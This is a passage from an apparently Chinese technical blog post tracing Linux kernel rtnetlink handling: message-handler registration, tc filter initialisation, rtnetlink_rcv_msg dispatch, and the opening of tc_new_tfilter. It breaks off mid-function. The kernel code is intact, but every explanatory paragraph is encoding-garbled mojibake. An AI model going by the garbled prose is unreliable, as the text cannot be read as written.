RTM_GETLINK, rtnl_getlink,</span><br><span class="line">      rtnl_dump_ifinfo, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_SETLINK, rtnl_setlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_NEWLINK, rtnl_newlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_DELLINK, rtnl_dellink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_GETADDR, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_GETROUTE, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_GETNETCONF, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_NEWLINKPROP, rtnl_newlinkprop, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_DELLINKPROP, rtnl_dellinkprop, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">rtnl_register(PF_BRIDGE, RTM_NEWNEIGH, rtnl_fdb_add, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_BRIDGE, RTM_DELNEIGH, rtnl_fdb_del, <span class="literal">NULL</span>,</span><br><span class="line">      RTNL_FLAG_BULK_DEL_SUPPORTED);</span><br><span class="line">rtnl_register(PF_BRIDGE, RTM_GETNEIGH, rtnl_fdb_get, rtnl_fdb_dump, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">rtnl_register(PF_BRIDGE, RTM_GETLINK, <span class="literal">NULL</span>, rtnl_bridge_getlink, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_BRIDGE, RTM_DELLINK, rtnl_bridge_dellink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_BRIDGE, RTM_SETLINK, rtnl_bridge_setlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_GETSTATS, rtnl_stats_get, rtnl_stats_dump,</span><br><span class="line">      <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_SETSTATS, rtnl_stats_set, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºæ¥çš„ï¼Œä¸»è¦æ˜¯é€šè¿‡<code>rtnl_register</code>å‡½æ•°å°†ä¸åŒçš„æ¶ˆæ¯ç±»å‹å’Œå¯¹åº”çš„æ“ä½œè¿›è¡Œäº†ç»‘å®šï¼Œè¿™é‡Œç®€å•çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°å®šä¹‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtnl_register</span><span class="params">(<span class="keyword">int</span> protocol, <span class="keyword">int</span> msgtype,</span></span></span><br><span class="line"><span class="params"><span class="function">   rtnl_doit_func doit, rtnl_dumpit_func dumpit,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = rtnl_register_internal(<span class="literal">NULL</span>, protocol, msgtype, doit, dumpit,</span><br><span class="line">     flags);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line">pr_err(<span class="string">&quot;Unable to register rtnetlink message handler, &quot;</span></span><br><span class="line">       <span class="string">&quot;protocol = %d, message type = %d\n&quot;</span>, protocol, msgtype);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿™ä¸ªå‡½æ•°å…¶å®å°±æ˜¯<code>rtnl_register_internal</code>å¥—äº†ä¸€å±‚å£³ï¼Œè¿™é‡Œä¸»è¦å…³æ³¨<code>rtnl_register</code>çš„å‚æ•°å®šä¹‰ã€‚å‰é¢å°±æ˜¯åè®®ï¼Œæ¶ˆæ¯ç±»å‹ã€‚ç´§éšçš„è¿™ä¸¤ä¸ªåˆ†åˆ«æ˜¯ä¸¤ä¸ªæ¯æ‰å‡½æ•°è¢«ä¼ å…¥ï¼Œè€Œè¿™ä¸¤ä¸ªæ¯æ‰å‡½æ•°å¯¹åº”çš„æ˜¯ä¸¤ç§ç±»å‹ï¼Œç¬¬ä¸€ç§æ˜¯åŠ¨ä½œå‡½æ•°ï¼Œç¬¬äºŒç§æ˜¯dumpå‡½æ•°dumpitï¼Œè€Œä»ä¸Šé¢çš„åˆå§‹åŒ–å‡½æ•°æ¥çœ‹æ˜¯æœ‰çš„æ¶ˆæ¯åªå­˜åœ¨ç¬¬ä¸€ä¸ªæœ‰çš„åªæœ‰ç¬¬äºŒä¸ªï¼Œè¿˜æœ‰çš„ä¸¤è€…éƒ½æœ‰ã€‚ä»å‰é¢çš„ç®€è¿°ä¸­çœ‹åˆ°å…¶å®æœ‰çš„æ¶ˆæ¯ç±»å‹æ˜¯æ²¡è¢«åˆå§‹åŒ–çš„æ¯”å¦‚<code>RTM_NEWTFILTER</code>ï¼Œæ·»åŠ ä¸€ä¸ªæµé‡è¿‡æ»¤å™¨ï¼Œå…¶æ˜¯åœ¨<code>tc_filter_init</code>å‡½æ•°ä¸­è¢«åˆå§‹åŒ–çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">tc_filter_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">tc_filter_wq = alloc_ordered_workqueue(<span class="string">&quot;tc_filter_workqueue&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!tc_filter_wq)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">err = register_pernet_subsys(&amp;tcf_net_ops);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> err_register_pernet_subsys;</span><br><span class="line"></span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_NEWTFILTER, tc_new_tfilter, <span class="literal">NULL</span>,</span><br><span class="line">      RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_DELTFILTER, tc_del_tfilter, <span class="literal">NULL</span>,</span><br><span class="line">      RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_GETTFILTER, tc_get_tfilter,</span><br><span class="line">      tc_dump_tfilter, RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_NEWCHAIN, tc_ctl_chain, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_DELCHAIN, tc_ctl_chain, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_GETCHAIN, tc_ctl_chain,</span><br><span class="line">      tc_dump_chain, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_register_pernet_subsys:</span><br><span class="line">destroy_workqueue(tc_filter_wq);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç”¨æˆ·é€šè¿‡<code>NETLINK_ROUTE</code>å¥—æ¥å­—å‘é€<code>RTM_NEWTFILTER</code>æ¶ˆæ¯ç”¨äºåˆ›å»ºä¸€ä¸ªæµé‡è¿‡æ»¤å™¨æ—¶ï¼Œå†…æ ¸ä¼šè°ƒç”¨<code>rtnetlink_rcv_msg</code>å‡½æ•°æ¥å¤„ç†<code>rtnetlink</code>æ¶ˆæ¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtnetlink_rcv_msg</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> sock_net(skb-&gt;sk);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtnl_link</span> *<span class="title">link</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">rtnl_kinds</span> <span class="title">kind</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="keyword">int</span> err = -EOPNOTSUPP;</span><br><span class="line">rtnl_doit_func doit;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line"><span class="keyword">int</span> family;</span><br><span class="line"><span class="keyword">int</span> type;</span><br><span class="line"></span><br><span class="line">type = nlh-&gt;nlmsg_type;</span><br><span class="line"><span class="keyword">if</span> (type &gt; RTM_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">type -= RTM_BASE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* All the messages must have at least 1 byte length */</span></span><br><span class="line"><span class="keyword">if</span> (nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(struct rtgenmsg))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">family = ((struct rtgenmsg *)nlmsg_data(nlh))-&gt;rtgen_family;</span><br><span class="line">kind = rtnl_msgtype_kind(type);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kind != RTNL_KIND_GET &amp;&amp; !netlink_net_capable(skb, CAP_NET_ADMIN))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">rcu_read_lock();</span><br><span class="line"><span class="keyword">if</span> (kind == RTNL_KIND_GET &amp;&amp; (nlh-&gt;nlmsg_flags &amp; NLM_F_DUMP)) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">rtnl</span>;</span></span><br><span class="line">rtnl_dumpit_func dumpit;</span><br><span class="line">u32 min_dump_alloc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">link = rtnl_get_link(family, type);</span><br><span class="line"><span class="keyword">if</span> (!link || !link-&gt;dumpit) &#123;</span><br><span class="line">family = PF_UNSPEC;</span><br><span class="line">link = rtnl_get_link(family, type);</span><br><span class="line"><span class="keyword">if</span> (!link || !link-&gt;dumpit)</span><br><span class="line"><span class="keyword">goto</span> err_unlock;</span><br><span class="line">&#125;</span><br><span class="line">owner = link-&gt;owner;</span><br><span class="line">dumpit = link-&gt;dumpit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (type == RTM_GETLINK - RTM_BASE)</span><br><span class="line">min_dump_alloc = rtnl_calcit(skb, nlh);</span><br><span class="line"></span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* need to do this before rcu_read_unlock() */</span></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(owner))</span><br><span class="line">err = -EPROTONOSUPPORT;</span><br><span class="line"></span><br><span class="line">rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">rtnl = net-&gt;rtnl;</span><br><span class="line"><span class="keyword">if</span> (err == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_dump_control</span> <span class="title">c</span> =</span> &#123;</span><br><span class="line">.dump= dumpit,</span><br><span class="line">.min_dump_alloc= min_dump_alloc,</span><br><span class="line">.<span class="keyword">module</span>= owner,</span><br><span class="line">&#125;;</span><br><span class="line">err = netlink_dump_start(rtnl, skb, nlh, &amp;c);</span><br><span class="line"><span class="comment">/* netlink_dump_start() will keep a reference on</span></span><br><span class="line"><span class="comment"> * module if dump is still in progress.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">module_put(owner);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">link = rtnl_get_link(family, type);</span><br><span class="line"><span class="keyword">if</span> (!link || !link-&gt;doit) &#123;</span><br><span class="line">family = PF_UNSPEC;</span><br><span class="line">link = rtnl_get_link(PF_UNSPEC, type);</span><br><span class="line"><span class="keyword">if</span> (!link || !link-&gt;doit)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">owner = link-&gt;owner;</span><br><span class="line"><span class="keyword">if</span> (!try_module_get(owner)) &#123;</span><br><span class="line">err = -EPROTONOSUPPORT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flags = link-&gt;flags;</span><br><span class="line"><span class="keyword">if</span> (kind == RTNL_KIND_DEL &amp;&amp; (nlh-&gt;nlmsg_flags &amp; NLM_F_BULK) &amp;&amp;</span><br><span class="line">    !(flags &amp; RTNL_FLAG_BULK_DEL_SUPPORTED)) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Bulk delete is not supported&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> err_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; RTNL_FLAG_DOIT_UNLOCKED) &#123;</span><br><span class="line">doit = link-&gt;doit;</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">if</span> (doit)</span><br><span class="line">err = doit(skb, nlh, extack);</span><br><span class="line">module_put(owner);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">rtnl_lock();</span><br><span class="line">link = rtnl_get_link(family, type);</span><br><span class="line"><span class="keyword">if</span> (link &amp;&amp; link-&gt;doit)</span><br><span class="line">err = link-&gt;doit(skb, nlh, extack);</span><br><span class="line">rtnl_unlock();</span><br><span class="line"></span><br><span class="line">module_put(owner);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">err_unlock:</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å‡½æ•°çš„ä¸»è¦é€»è¾‘ï¼Œé¦–å…ˆæ˜¯åœ¨æ¶ˆæ¯ä¸­å–å‡ºå…¶<code>family</code>å’Œ<code>type</code>ï¼Œç´§æ¥ç€æ ¹ç»<code>family</code>å’Œ<code>type</code>å›å»åˆ°<code>link</code>ã€‚åœ¨æœ€åè°ƒç”¨<code>link-&gt;doit(skb, nlh, extack)</code>ï¼Œç”±å‰é¢çš„å‡½æ•°å¯ä»¥å¾—çŸ¥çš„æ˜¯å…¶ä¼šè°ƒç”¨å¦‚ä¸‹å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tc_new_tfilter</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *n,</span></span></span><br><span class="line"><span class="params"><span class="function">  struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> sock_net(skb-&gt;sk);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tca</span>[<span class="title">TCA_MAX</span> + 1];</span></span><br><span class="line"><span class="keyword">char</span> name[IFNAMSIZ];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span>;</span></span><br><span class="line">u32 protocol;</span><br><span class="line">u32 prio;</span><br><span class="line"><span class="keyword">bool</span> prio_allocate;</span><br><span class="line">u32 parent;</span><br><span class="line">u32 chain_index;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Qdisc</span> *<span class="title">q</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcf_chain_info</span> <span class="title">chain_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcf_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcf_block</span> *<span class="title">block</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span> *<span class="title">tp</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cl;</span><br><span class="line"><span class="keyword">void</span> *fh;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"><span class="keyword">int</span> tp_created;</span><br><span class="line"><span class="keyword">bool</span> rtnl_held = <span class="literal">false</span>;</span><br><span class="line">u32 flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!netlink_ns_capable(skb, net-&gt;user_ns, CAP_NET_ADMIN))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">replay:</span><br><span class="line">tp_created = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err = nlmsg_parse_deprecated(n, <span class="keyword">sizeof</span>(*t), tca, TCA_MAX,</span><br><span class="line">     rtm_tca_policy, extack);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">t = nlmsg_data(n);</span><br><span class="line">protocol = TC_H_MIN(t-&gt;tcm_info);</span><br><span class="line">prio = TC_H_MAJ(t-&gt;tcm_info);</span><br><span class="line">prio_allocate = <span class="literal">false</span>;</span><br><span class="line">parent = t-&gt;tcm_parent;</span><br><span class="line">tp = <span class="literal">NULL</span>;</span><br><span class="line">cl = <span class="number">0</span>;</span><br><span class="line">block = <span class="literal">NULL</span>;</span><br><span class="line">q = <span class="literal">NULL</span>;</span><br><span class="line">chain = <span class="literal">NULL</span>;</span><br><span class="line">flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (prio == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* If no priority is provided by the user,</span></span><br><span class="line"><span class="comment"> * we allocate one.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (n-&gt;nlmsg_flags &amp; NLM_F_CREATE) &#123;</span><br><span class="line">prio = TC_H_MAKE(<span class="number">0x80000000</span>U, <span class="number">0U</span>);</span><br><span class="line">prio_allocate = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Invalid filter command with priority of zero&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Find head of filter chain. */</span></span><br><span class="line"></span><br><span class="line">err = __tcf_qdisc_find(net, &amp;q, &amp;parent, t-&gt;tcm_ifindex, <span class="literal">false</span>, extack);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcf_proto_check_kind(tca[TCA_KIND], name)) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Specified TC filter name too long&quot;</span>);</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take rtnl mutex if rtnl_held was set to true on previous iteration,</span></span><br><span class="line"><span class="comment"> * block is shared (no qdisc found), qdisc is not unlocked, classifier</span></span><br><span class="line"><span class="comment"> * type is not specified, classifier is not unlocked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (rtnl_held ||</span><br><span class="line">    (q &amp;&amp; !(q-&gt;ops-&gt;cl_ops-&gt;flags &amp; 